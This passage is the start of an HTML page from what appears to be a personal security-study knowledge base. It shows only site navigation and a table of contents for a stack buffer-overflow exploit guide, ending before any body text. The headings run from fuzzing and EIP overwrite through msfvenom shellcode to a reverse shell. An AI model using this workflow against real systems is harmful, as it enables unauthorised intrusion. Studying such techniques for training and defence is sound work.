@@ -1,0 +1,2404 @@
+
+<!doctype html>
+<html lang="en" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+      
+      
+      
+        <link rel="prev" href="../burpspray/">
+      
+      
+        <link rel="next" href="../cherry/">
+      
+      
+      <link rel="icon" href="../assets/images/favicon.png">
+      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.6.4">
+    
+    
+      
+        <title>Buffer Overflow x86 - My Knowledge Base</title>
+      
+    
+    
+      <link rel="stylesheet" href="../assets/stylesheets/main.8608ea7d.min.css">
+      
+        
+        <link rel="stylesheet" href="../assets/stylesheets/palette.06af60db.min.css">
+      
+      
+
+
+    
+    
+      
+    
+    
+      
+        
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,300i,400,400i,700,700i%7CRoboto+Mono:400,400i,700,700i&display=fallback">
+        <style>:root{--md-text-font:"Roboto";--md-code-font:"Roboto Mono"}</style>
+      
+    
+    
+    <script>__md_scope=new URL("..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    
+      
+
+    
+    
+    
+  </head>
+  
+  
+    
+    
+    
+    
+    
+    <body dir="ltr" data-md-color-scheme="slate" data-md-color-primary="indigo" data-md-color-accent="indigo">
+  
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#buffer-overflow-x86" class="md-skip">
+          Skip to content
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+    
+      
+
+  
+
+<header class="md-header md-header--shadow" data-md-component="header">
+  <nav class="md-header__inner md-grid" aria-label="Header">
+    <a href=".." title="My Knowledge Base" class="md-header__button md-logo" aria-label="My Knowledge Base" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
+
+    </a>
+    <label class="md-header__button md-icon" for="__drawer">
+      
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3zm0 5h18v2H3zm0 5h18v2H3z"/></svg>
+    </label>
+    <div class="md-header__title" data-md-component="header-title">
+      <div class="md-header__ellipsis">
+        <div class="md-header__topic">
+          <span class="md-ellipsis">
+            My Knowledge Base
+          </span>
+        </div>
+        <div class="md-header__topic" data-md-component="header-topic">
+          <span class="md-ellipsis">
+            
+              Buffer Overflow x86
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+      
+    
+    
+    
+    
+      <label class="md-header__button md-icon" for="__search">
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+      </label>
+      <div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
+      <label class="md-search__icon md-icon" for="__search">
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
+      </label>
+      <nav class="md-search__options" aria-label="Search">
+        
+        <button type="reset" class="md-search__icon md-icon" title="Clear" aria-label="Clear" tabindex="-1">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg>
+        </button>
+      </nav>
+      
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" tabindex="0" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="search-result">
+          <div class="md-search-result__meta">
+            Initializing search
+          </div>
+          <ol class="md-search-result__list" role="presentation"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+    
+  </nav>
+  
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+          
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+
+
+<nav class="md-nav md-nav--primary" aria-label="Navigation" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href=".." title="My Knowledge Base" class="md-nav__button md-logo" aria-label="My Knowledge Base" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
+
+    </a>
+    My Knowledge Base
+  </label>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href=".." class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Home
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../bashguide/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Bash Scripting
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../bruteforce/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Bruteforce Attacks
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../burpspray/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Burpsuite - Stuffing & Spraying
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+    
+  
+  
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
+      
+      
+        
+      
+      
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          
+  
+  <span class="md-ellipsis">
+    Buffer Overflow x86
+    
+  </span>
+  
+
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <a href="./" class="md-nav__link md-nav__link--active">
+        
+  
+  <span class="md-ellipsis">
+    Buffer Overflow x86
+    
+  </span>
+  
+
+      </a>
+      
+        
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#overview-debugging-remote-exploitation" class="md-nav__link">
+    <span class="md-ellipsis">
+      Overview: Debugging &amp; Remote Exploitation
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Overview: Debugging & Remote Exploitation">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#q1-do-i-need-immunity-debugger-to-be-on-or-attached-to-the-target-machine-can-i-get-the-same-information-remotely" class="md-nav__link">
+    <span class="md-ellipsis">
+      Q1 Do I need Immunity Debugger to be “on” or attached to the target machine? Can I get the same information remotely?
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#local-vs-remote" class="md-nav__link">
+    <span class="md-ellipsis">
+      Local vs. Remote:
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#answer" class="md-nav__link">
+    <span class="md-ellipsis">
+      Answer:
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#q2-is-it-possible-to-do-this-sort-of-exploit-remotely" class="md-nav__link">
+    <span class="md-ellipsis">
+      Q2: Is it possible to do this sort of exploit remotely?
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#answer_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      Answer:
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#a-comprehensive-guide-to-developing-a-buffer-overflow-exploit" class="md-nav__link">
+    <span class="md-ellipsis">
+      A Comprehensive Guide to Developing a Buffer Overflow Exploit
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="A Comprehensive Guide to Developing a Buffer Overflow Exploit">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#anatomy-of-process-memory-typical-in-windows" class="md-nav__link">
+    <span class="md-ellipsis">
+      Anatomy of Process Memory (Typical in Windows)
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#step-1-spiking" class="md-nav__link">
+    <span class="md-ellipsis">
+      Step 1. Spiking
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Step 1. Spiking">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#objective" class="md-nav__link">
+    <span class="md-ellipsis">
+      Objective
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#what-you-do" class="md-nav__link">
+    <span class="md-ellipsis">
+      What you do
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#example" class="md-nav__link">
+    <span class="md-ellipsis">
+      Example
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#step-2-fuzzing" class="md-nav__link">
+    <span class="md-ellipsis">
+      Step 2. Fuzzing
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Step 2. Fuzzing">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#objective_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      Objective
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#how" class="md-nav__link">
+    <span class="md-ellipsis">
+      How
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#example-python-script-1py" class="md-nav__link">
+    <span class="md-ellipsis">
+      Example Python Script (1.py)
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#outcome" class="md-nav__link">
+    <span class="md-ellipsis">
+      Outcome
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#step-3-finding-the-offset" class="md-nav__link">
+    <span class="md-ellipsis">
+      Step 3. Finding the Offset
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Step 3. Finding the Offset">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#objective_2" class="md-nav__link">
+    <span class="md-ellipsis">
+      Objective
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#tool" class="md-nav__link">
+    <span class="md-ellipsis">
+      Tool
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#process" class="md-nav__link">
+    <span class="md-ellipsis">
+      Process
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#step-4-overwriting-the-eip" class="md-nav__link">
+    <span class="md-ellipsis">
+      Step 4. Overwriting the EIP
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Step 4. Overwriting the EIP">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#objective_3" class="md-nav__link">
+    <span class="md-ellipsis">
+      Objective
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#how_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      How
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#example-python-script-3py" class="md-nav__link">
+    <span class="md-ellipsis">
+      Example Python Script (3.py)
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#outcome_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      Outcome
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#step-5-finding-bad-characters" class="md-nav__link">
+    <span class="md-ellipsis">
+      Step 5. Finding Bad Characters
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Step 5. Finding Bad Characters">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#objective_4" class="md-nav__link">
+    <span class="md-ellipsis">
+      Objective
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#process_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      Process
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#example-python-script-4py" class="md-nav__link">
+    <span class="md-ellipsis">
+      Example Python Script (4.py)
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#analysis-in-debugger" class="md-nav__link">
+    <span class="md-ellipsis">
+      Analysis in Debugger
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#step-6-finding-a-suitable-module-jmp-esp-address" class="md-nav__link">
+    <span class="md-ellipsis">
+      Step 6. Finding a Suitable Module &amp; JMP ESP Address
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Step 6. Finding a Suitable Module & JMP ESP Address">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#objective_5" class="md-nav__link">
+    <span class="md-ellipsis">
+      Objective
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#using-monapy-in-immunity" class="md-nav__link">
+    <span class="md-ellipsis">
+      Using Mona.py in Immunity
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#using-nasm_shell-optional" class="md-nav__link">
+    <span class="md-ellipsis">
+      Using nasm_shell (Optional)
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#step-7-overwriting-the-eip-with-a-jmp-esp-address" class="md-nav__link">
+    <span class="md-ellipsis">
+      Step 7. Overwriting the EIP with a JMP ESP Address
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Step 7. Overwriting the EIP with a JMP ESP Address">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#objective_6" class="md-nav__link">
+    <span class="md-ellipsis">
+      Objective
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#payload" class="md-nav__link">
+    <span class="md-ellipsis">
+      Payload
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#little-endian-note" class="md-nav__link">
+    <span class="md-ellipsis">
+      Little Endian Note
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#notes" class="md-nav__link">
+    <span class="md-ellipsis">
+      Notes
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#step-8-generating-shellcode-and-getting-a-reverse-shell" class="md-nav__link">
+    <span class="md-ellipsis">
+      Step 8. Generating Shellcode and Getting a Reverse Shell
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Step 8. Generating Shellcode and Getting a Reverse Shell">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#objective_7" class="md-nav__link">
+    <span class="md-ellipsis">
+      Objective
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#generate-shellcode-with-msfvenom" class="md-nav__link">
+    <span class="md-ellipsis">
+      Generate Shellcode with msfvenom
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Generate Shellcode with msfvenom">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#breakdown" class="md-nav__link">
+    <span class="md-ellipsis">
+      Breakdown:
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#incorporate-shellcode-into-the-final-exploit-6py" class="md-nav__link">
+    <span class="md-ellipsis">
+      Incorporate Shellcode into the Final Exploit (6.py)
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#gaining-the-shell" class="md-nav__link">
+    <span class="md-ellipsis">
+      Gaining the Shell
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Gaining the Shell">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#listener" class="md-nav__link">
+    <span class="md-ellipsis">
+      Listener
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#execute-exploit" class="md-nav__link">
+    <span class="md-ellipsis">
+      Execute Exploit
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#summary" class="md-nav__link">
+    <span class="md-ellipsis">
+      Summary
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#final-clarifications" class="md-nav__link">
+    <span class="md-ellipsis">
+      Final Clarifications
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Final Clarifications">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#debugging-remotely" class="md-nav__link">
+    <span class="md-ellipsis">
+      Debugging Remotely
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#bad-characters-identification" class="md-nav__link">
+    <span class="md-ellipsis">
+      Bad Characters Identification
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#finding-jmp-esp-xffxe4" class="md-nav__link">
+    <span class="md-ellipsis">
+      Finding JMP ESP (\xff\xe4)
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#little-endian-and-x64-considerations" class="md-nav__link">
+    <span class="md-ellipsis">
+      Little Endian and x64 Considerations
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../cherry/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Cherrytree
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../hmet/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Hacking Methodology
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../igtools/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Information Gathering Tools
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../linux-commands/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Linux Commands
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../linuxuserpriv/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Linux Users and Privileges
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../manuexpl/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Manual Exploitation
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../hostnamemapping/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Mapping Hostnames to IPs
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../msfc/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    MSFconsole
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../networking/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Networking
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../torproxy/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Proxychains Tor
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../pynet/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Python Networking
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../revul/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Researching Vulnerabilities
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../scanenum/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Scanning and Enumeration
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../shell/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Shell Exploitation
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../smb/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    SMB (Server Message Block)
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../ssh/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    SSH (Secure Shell)
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../wpexplo/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Wordpress exploitation
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_23" >
+        
+          
+          <label class="md-nav__link" for="__nav_23" id="__nav_23_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    HTB
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_23_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_23">
+            <span class="md-nav__icon md-icon"></span>
+            HTB
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../threeawsshell/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Three - S3 Reverse Shell
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_24" >
+        
+          
+          <label class="md-nav__link" for="__nav_24" id="__nav_24_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    MkDocs
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_24_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_24">
+            <span class="md-nav__icon md-icon"></span>
+            MkDocs
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../create/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Create post
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../venv/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Create Virtual Enviroment
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../mkdocs-formatting-guide/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Formatting Guide
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../github/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Github create & update
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#overview-debugging-remote-exploitation" class="md-nav__link">
+    <span class="md-ellipsis">
+      Overview: Debugging &amp; Remote Exploitation
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Overview: Debugging & Remote Exploitation">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#q1-do-i-need-immunity-debugger-to-be-on-or-attached-to-the-target-machine-can-i-get-the-same-information-remotely" class="md-nav__link">
+    <span class="md-ellipsis">
+      Q1 Do I need Immunity Debugger to be “on” or attached to the target machine? Can I get the same information remotely?
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#local-vs-remote" class="md-nav__link">
+    <span class="md-ellipsis">
+      Local vs. Remote:
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#answer" class="md-nav__link">
+    <span class="md-ellipsis">
+      Answer:
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#q2-is-it-possible-to-do-this-sort-of-exploit-remotely" class="md-nav__link">
+    <span class="md-ellipsis">
+      Q2: Is it possible to do this sort of exploit remotely?
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#answer_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      Answer:
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#a-comprehensive-guide-to-developing-a-buffer-overflow-exploit" class="md-nav__link">
+    <span class="md-ellipsis">
+      A Comprehensive Guide to Developing a Buffer Overflow Exploit
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="A Comprehensive Guide to Developing a Buffer Overflow Exploit">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#anatomy-of-process-memory-typical-in-windows" class="md-nav__link">
+    <span class="md-ellipsis">
+      Anatomy of Process Memory (Typical in Windows)
+    </span>
+  </a>
+  
